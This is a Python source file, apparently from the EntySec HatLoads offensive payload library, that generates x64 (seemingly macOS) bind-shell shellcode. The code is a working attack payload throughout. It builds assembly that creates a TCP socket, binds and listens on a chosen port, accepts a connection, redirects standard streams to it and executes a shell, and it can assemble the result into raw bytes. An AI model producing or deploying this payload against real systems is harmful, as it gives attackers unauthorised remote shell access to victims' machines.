#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2022 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from hatasm import HatAsm
from hatvenom import HatVenom

from hatloads.words import Words


class ShellBindTCP(HatAsm, HatVenom, Words):
    def generate(self, assemble=True, options={}):
        if 'BPORT' not in options:
            return b''

        if 'SHELL' in options:
            shell = options['SHELL']
        else:
            shell = self.shell['sh']

        shell = shell[::-1]
        bport = self.convert_port(options['BPORT'])

        shellcode = f"""
        start:
            xor rdi, rdi
            mov dil, 0x2
            xor rsi, rsi
            mov sil, 0x1
            xor rdx, rdx

            xor rax, rax
            mov al, 2
            ror rax, 0x28
            mov al, 0x61
            mov r12, rax
            syscall

            mov r9, rax
            mov rdi, rax
            xor rsi, rsi
            push rsi
            mov esi, 0x{bport.hex()}0101
            sub esi, 1
            push rsi
            mov rsi, rsp
            mov dl, 0x10
            add r12b, 0x7
            mov rax, r12
            syscall

            xor rsi, rsi
            inc rsi
            add r12b, 0x2
            mov rax, r12
            syscall

            xor rsi, rsi
            sub r12b, 0x4c
            mov rax, r12
            syscall

            mov rdi, rax
            xor rsi, rsi
            add r12b, 0x3c
            mov rax, r12
            syscall

            inc rsi
            mov rax, r12
            syscall

            xor rsi, rsi
            push rsi
            mov rdi, 0x{(shell+b'/').hex()}
            push rdi
            mov rdi, rsp
            xor rdx, rdx

            sub r12b, 0x1f
            mov rax, r12
            syscall
        """

        if assemble:
            return self.assemble('x64', shellcode)
        return shellcode
